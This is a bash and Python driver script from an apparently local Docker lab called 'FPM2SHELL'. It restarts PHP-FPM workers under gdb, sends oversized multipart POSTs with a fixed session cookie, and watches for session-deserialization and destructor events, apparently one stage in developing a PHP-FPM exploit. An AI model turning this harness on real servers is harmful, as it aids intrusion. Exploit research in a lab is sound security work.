#!/usr/bin/env bash
# FPM2SHELL module-3 driver: fresh worker per attempt, gdb reattach, A2 sweep.
# Usage: ./m3_drive.sh <filler_bytes> [record_sid]
set -u
LAB="$(cd "$(dirname "$0")" && pwd)"
SID="${2:-f2scal0000000000000000000001}"
FILL="${1:-5000000}"

 recycle() {
  docker exec f2s-php sh -c "kill \$(pgrep -f 'pool www') 2>/dev/null"; sleep 1.2
  docker exec f2s-php sh -c "kill \$(pgrep gdb) 2>/dev/null"; sleep 0.5
  PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1)
  docker exec -d f2s-php sh -c "gdb -batch -p $PID -x /tmp/g3.gdb > /tmp/g$$.out 2>&1"
  sleep 3
}

fire() {  # $1 = filler bytes
  python3 - "$1" "$SID" <<'PYEOF'
import sys, http.client
from pathlib import Path
fill, sid = int(sys.argv[1]), sys.argv[2]
BOUNDARY = b"----f2s" + b"m3drive000000000"
def part(n, b, fn=None):
    d = f'Content-Disposition: form-data; name="{n}"'
    if fn is not None: d += f'; filename="{fn}"'
    return b"--"+BOUNDARY+b"\r\n"+d.encode()+b"\r\n\r\n"+b+b"\r\n"
body = part("filler", b"Q"*fill) + b"--"+BOUNDARY+b"--\r\n"
conn = http.client.HTTPConnection("127.0.0.1", 18120, timeout=120)
conn.request("POST", "/index.php", body=body, headers={
  "Content-Type": f"multipart/form-data; boundary={BOUNDARY.decode()}",
  "Content-Length": str(len(body)), "Cookie": f"PHPSESSID={sid}"})
r = conn.getresponse(); print("A2:", r.status, r.read(50)[:40]); conn.close()
conn = http.client.HTTPConnection("127.0.0.1", 18120, timeout=30)
conn.request("GET", "/index.php", headers={"Cookie": f"PHPSESSID={sid}"})
r = conn.getresponse(); print("probe:", r.status, r.read(60).decode("latin1","replace")[:50]); conn.close()
PYEOF
}

recycle
fire "$FILL"
sleep 1
docker logs f2s-php --tail 8 2>&1 | grep -E "Fatal|exited" | tail -3
echo "--- trace (this attempt) ---"
docker exec f2s-php sh -c "grep -aE 'UNSERZ|DESTROY' /tmp/g\$*.out /tmp/g3.out /tmp/g4.out 2>/dev/null | tail -6"
